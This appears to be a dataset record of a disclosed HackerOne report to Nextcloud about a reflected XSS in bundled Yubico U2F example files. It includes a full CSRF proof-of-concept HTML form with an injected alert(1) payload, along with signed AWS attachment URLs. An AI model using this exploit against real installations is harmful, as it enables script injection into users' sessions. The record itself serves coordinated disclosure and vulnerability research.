{
  "reported_to": "Nextcloud",
  "reported_by": "lukasreschke ",
  "title": "Reflected XSS in U2F plugin by shipping the example endpoints",
  "content": "\nWhile running a RIPS scan against our instrumentalized source code it noticed that the file /apps/twofactor_u2f/vendor/yubico/u2flib-server/examples/localstorage/index.php echoes on user input:\n<image_0>\nI was first a tad confused because the examples have been removed from our Git repository, but the release from apps.nextcloud.com ships with that file. So I suppose the Makefile is downloading the dependencies again.\nWhile exploiting this is not entirely trivial due to some sanity checks in the code above it is however possible, the following CSRF PoC will trigger a popup:\nCode 2.58 KiB\n1<html>\n2  <!-- CSRF PoC - generated by Burp Suite Professional -->\n3  <body>\n4    <form action=\"http://10.211.55.7/stable9/apps/twofactor_u2f/vendor/yubico/u2flib-server/examples/localstorage/index.php\" method=\"POST\">\n5      <input type=\"hidden\" name=\"doAuthenticate\" value=\"&#123;&quot;signatureData&quot;&#58;&quot;AQAAABowRAIgMZL56nkLO7gs2OYoUW8RE3xAWLAvzroTiWO2T2PBb&#45;wCID6zjKjjxsqqG5NZ4upnT1xCeFmnDSefS&#95;TWHZWjoXgx&quot;&#44;&quot;clientData&quot;&#58;&quot;eyAiY2hhbGxlbmdlIjogIjFQX1l4TWpGVEhPcmNyQmlwUF8tLXRtVjA4SXNRUnVXaVlwZVZYVlNpVFUiLCAib3JpZ2luIjogImh0dHA6XC9cLzEwLjIxMS41NS43IiwgInR5cCI6ICJuYXZpZ2F0b3IuaWQuZ2V0QXNzZXJ0aW9uIiB9&quot;&#44;&quot;keyHandle&quot;&#58;&quot;9cgajEA4PWsnEbpgfnaxFBxMsiUNWo4GKbdk5PrdMn3c139bG3mXqLVw3VwpdcQzzPmVyGF6KBvFZsb2jpzdmg&quot;&#125;\" />\n6      <input type=\"hidden\" name=\"request\" value=\"&#91;&#123;&quot;version&quot;&#58;&quot;U2F&#95;V2&quot;&#44;&quot;challenge&quot;&#58;&quot;1P&#95;YxMjFTHOrcrBipP&#95;&#45;&#45;tmV08IsQRuWiYpeVXVSiTU&quot;&#44;&quot;keyHandle&quot;&#58;&quot;9cgajEA4PWsnEbpgfnaxFBxMsiUNWo4GKbdk5PrdMn3c139bG3mXqLVw3VwpdcQzzPmVyGF6KBvFZsb2jpzdmg&quot;&#44;&quot;appId&quot;&#58;&quot;http&#58;&#47;&#47;10&#46;211&#46;55&#46;7&quot;&#125;&#93;\" />\n7      <input type=\"hidden\" name=\"registrations\" value=\"&#91;&#123;&quot;keyHandle&quot;&#58;&quot;9cgajEA4PWsnEbpgfnaxFBxMsiUNWo4GKbdk5PrdMn3c139bG3mXqLVw3VwpdcQzzPmVyGF6KBvFZsb2jpzdmg&quot;&#44;&quot;publicKey&quot;&#58;&quot;BPtO8T0VluUL14FRKvEkZ5lP&#47;3W4F7er4WS87iYfrpoKj0Fjo&#43;M&#43;zAxNsuhYd&#43;3rYQFVPr4hflhOh3lMSZ605Fg&#61;&quot;&#44;&quot;certificate&quot;&#58;&quot;MIICLjCCARigAwIBAgIECmML&#92;&#47;zALBgkqhkiG9w0BAQswLjEsMCoGA1UEAxMjWXViaWNvIFUyRiBSb290IENBIFNlcmlhbCA0NTcyMDA2MzEwIBcNMTQwODAxMDAwMDAwWhgPMjA1MDA5MDQwMDAwMDBaMCkxJzAlBgNVBAMMHll1YmljbyBVMkYgRUUgU2VyaWFsIDE3NDI2MzI5NTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABKQjZF26iyPtbNnl5IuTKs&#92;&#47;fRWTHVzHxz1IHRRBrSbqWD60PCqUJPe4zkIRFqBa4NnzdhVcS80nlZuY3ANQm0J&#43;jJjAkMCIGCSsGAQQBgsQKAgQVMS4zLjYuMS40LjEuNDE0ODIuMS4yMAsGCSqGSIb3DQEBCwOCAQEAZTmwMqHPxEjSB64Umwq2tGDKplAcEzrwmg6kgS8KPkJKXKSu9T1H6XBM9&#43;LAE9cN48oUirFFmDIlTbZRXU2Vm2qO9OdrSVFY&#43;qdbF9oti8CKAmPHuJZSW6ii7qNE59dHKUaP4lDYpnhRDqttWSUalh2LPDJQUpO9bsJPkgNZAhBUQMYZXL&#92;&#47;MQZLRYkX&#43;ld7llTNOX5u7n&#92;&#47;4Y5EMr&#43;lqOyVVC9lQ6JP6xoa9q6Zp9&#43;Y9ZmLCecrrcuH6&#43;pLDgAzPcc8qxhC2OR1B0ZSpI9RBgcT0KqnVE0tq1KEDeokPqF3MgmDRkJ&#43;&#43;&#92;&#47;a2pV0wAYfPC3tC57BtBdH&#92;&#47;UXEB8xZVFhtA&#61;&#61;wzh87&apos;&#45;alert&#40;1&#41;&#45;&apos;k50k8&quot;&#44;&quot;counter&quot;&#58;&#45;1&#125;&#93;\" />\n8      <input type=\"submit\" value=\"Submit request\" />\n9    </form>\n10  </body>\n11</html>\n<image_1>\nThis code is part of the official Yubico PHP U2F library. In a first step I'll coordinate with @christophwurst to remove this file from the release on apps.nextcloud.com, then I'll make sure to reach out to Yubico to get this resolved in their library.\n\n",
  "severity": [
    7.4,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Generic"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/451/9bf7ae6c01699f343137e9fe2b98d5aa16e7ff18/rips-result.png?response-content-disposition=attachment%3B%20filename%3D%22rips-result.png%22%3B%20filename%2A%3DUTF-8%27%27rips-result.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6KKWSDMA%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T225131Z&X-Amz-Expires=771&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCck2AFovk79nItWfm%2FIHydDGHm7wuazWxJF2tW6heRUgIhAPEBFri3I7U4RtW3ecIvFTMs%2Bp6%2BN7hp6Mx4Qav95kYuKrIFCDIQAxoMMDEzNjE5Mjc0ODQ5Igwh0IGBoA4KAERRlHUqjwVyYpAt%2BhfmiTg9lDDPrE%2B7hfhGum%2BJvwvFdfkfz9%2FrEjD%2Fm0STknp02IDTIimbu4Z4d0VN5PmZ12PTqc13UYF0LR7vKAB%2FuQbXwyrrLSBCrnndedaRZZqUBH9WVNRwJXBRWX5IpwiwaGvN5hlryTfjeNv0N1Mm%2FdbVYo1ICfOR69Yif%2BB%2FK20qNLn4sG1i9vHbu38p1ahjn0ppEFN50RIt6LHGymQHVNnSiEOYZnexxcLhUNzm6AOr1Q5W7LG01XHViQ%2F%2FSMOomwQ0dVswb9cTAH3Lc4xv4TCkntqOvpPXujSMutbFDuQQoaMDnbSLCf3YZPNthX0x5J61Y8xTmw9COYu5QjmFfhNbksTY2NKi6r97oi%2BhT5qJdCN%2F5t3G2g2hDEqANz7n3IgBsmKFiboBQYmwjqETjXYFVPcsESbcbm6IMprJNfcLaRVdOVm57zdqONjGAjk8vTyFuGucof%2B9%2BSdoDcmBwyNzu7CZE9eHbi6OYskvjJp16Puf8cctCsgUiDOnUjNm2Lzj3Cs8LUycUwjxUPQlgjztTqoBSCPkPb18rgP8btKzKMa62ysj2Tmnv9FB3ESULT2l%2FuIUpej%2F6vcHD6bV9xvCpCVsGXP41ffCXiVKofFTrpbLX316eYv6yZKahloaaN7eItyKONX%2BKsMC20JkgIN5c3Ip38hFB95WyUT4g%2BAfdc56UR3p5GcUvSKQj6o5ag2Jb97zZqV5XyFzsQlUACurMQuzvMH1kfF4mk%2BrRjL3RUwykJBAi7xoopBiX8aa%2FBeq3Yoxuuw895MopyWhg7jNh8pcbe%2BP5grk9e7T5nVTTk5nIxc374%2Bfv0CXYI0lu4fGYELhDsUIYnkW%2FPI8nm4jrQ77mF4TMNTjkL8GOrABc61WmmWrM2nnujQ72oefEWJp1wmybegRODApSAMyWXMaJ69tHRpX%2FR87Cn6fvgNgpyVOtd%2BiUQulr6E0dwkAivaZzi3vPT%2FWbIhbnXJfJyfFanKHmvjmZevxGewJqsgb7tDDIt9WO7xcDURvnw8fDSlJfI8JcC5ObgjAMVnbeJkalMY%2FURrWNxG2lkWOU9bttUWLZM0d0qtlNfi%2FX8AL61va%2FW%2BSDaEh92lyVRm%2F0EQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=59dbc0170c72712acf4e60b3ad819894bc6ad0797cc6ee188ead67c38a6e76ef",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/453/a1804871edab52a78fbd40f588dadab7b9697784/poc-popup.png?response-content-disposition=attachment%3B%20filename%3D%22poc-popup.png%22%3B%20filename%2A%3DUTF-8%27%27poc-popup.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6KKWSDMA%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T225131Z&X-Amz-Expires=771&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCck2AFovk79nItWfm%2FIHydDGHm7wuazWxJF2tW6heRUgIhAPEBFri3I7U4RtW3ecIvFTMs%2Bp6%2BN7hp6Mx4Qav95kYuKrIFCDIQAxoMMDEzNjE5Mjc0ODQ5Igwh0IGBoA4KAERRlHUqjwVyYpAt%2BhfmiTg9lDDPrE%2B7hfhGum%2BJvwvFdfkfz9%2FrEjD%2Fm0STknp02IDTIimbu4Z4d0VN5PmZ12PTqc13UYF0LR7vKAB%2FuQbXwyrrLSBCrnndedaRZZqUBH9WVNRwJXBRWX5IpwiwaGvN5hlryTfjeNv0N1Mm%2FdbVYo1ICfOR69Yif%2BB%2FK20qNLn4sG1i9vHbu38p1ahjn0ppEFN50RIt6LHGymQHVNnSiEOYZnexxcLhUNzm6AOr1Q5W7LG01XHViQ%2F%2FSMOomwQ0dVswb9cTAH3Lc4xv4TCkntqOvpPXujSMutbFDuQQoaMDnbSLCf3YZPNthX0x5J61Y8xTmw9COYu5QjmFfhNbksTY2NKi6r97oi%2BhT5qJdCN%2F5t3G2g2hDEqANz7n3IgBsmKFiboBQYmwjqETjXYFVPcsESbcbm6IMprJNfcLaRVdOVm57zdqONjGAjk8vTyFuGucof%2B9%2BSdoDcmBwyNzu7CZE9eHbi6OYskvjJp16Puf8cctCsgUiDOnUjNm2Lzj3Cs8LUycUwjxUPQlgjztTqoBSCPkPb18rgP8btKzKMa62ysj2Tmnv9FB3ESULT2l%2FuIUpej%2F6vcHD6bV9xvCpCVsGXP41ffCXiVKofFTrpbLX316eYv6yZKahloaaN7eItyKONX%2BKsMC20JkgIN5c3Ip38hFB95WyUT4g%2BAfdc56UR3p5GcUvSKQj6o5ag2Jb97zZqV5XyFzsQlUACurMQuzvMH1kfF4mk%2BrRjL3RUwykJBAi7xoopBiX8aa%2FBeq3Yoxuuw895MopyWhg7jNh8pcbe%2BP5grk9e7T5nVTTk5nIxc374%2Bfv0CXYI0lu4fGYELhDsUIYnkW%2FPI8nm4jrQ77mF4TMNTjkL8GOrABc61WmmWrM2nnujQ72oefEWJp1wmybegRODApSAMyWXMaJ69tHRpX%2FR87Cn6fvgNgpyVOtd%2BiUQulr6E0dwkAivaZzi3vPT%2FWbIhbnXJfJyfFanKHmvjmZevxGewJqsgb7tDDIt9WO7xcDURvnw8fDSlJfI8JcC5ObgjAMVnbeJkalMY%2FURrWNxG2lkWOU9bttUWLZM0d0qtlNfi%2FX8AL61va%2FW%2BSDaEh92lyVRm%2F0EQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b27cc4f2809de99bfd9be0158174b920d1912e9fb1750ded406321877682db42"
  },
  "disclosed_date": 1490197320,
  "report_url": "https://hackerone.com/reports/192786",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Run a RIPS scan against the source code to identify the vulnerable file: /apps/twofactor_u2f/vendor/yubico/u2flib-server/examples/localstorage/index.php"
    ],
    [
      2,
      "Craft a CSRF PoC that sends malicious input to the vulnerable endpoint, triggering a reflected XSS popup"
    ]
  ],
  "vuln_description": "The vulnerability is a reflected XSS in the U2F plugin due to the inclusion of example endpoints in the release package. The file /apps/twofactor_u2f/vendor/yubico/u2flib-server/examples/localstorage/index.php echoes user input without proper sanitization, allowing for XSS attacks when specially crafted input is submitted.",
  "reason": "While the vulnerability involves understanding the interaction between the example endpoint and user input, the discovery process was straightforward with the use of automated scanning tools (RIPS). The attack requires crafting a CSRF payload but doesn't involve complex application states or novel logic.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves a reflected XSS in a shipped example file, which is not part of the normal application flow but rather an included dependency. The methodology focuses on testing user sessions and actions within the same application context, not on analyzing included dependencies or example files for vulnerabilities.",
    "is_detectable": false
  }
}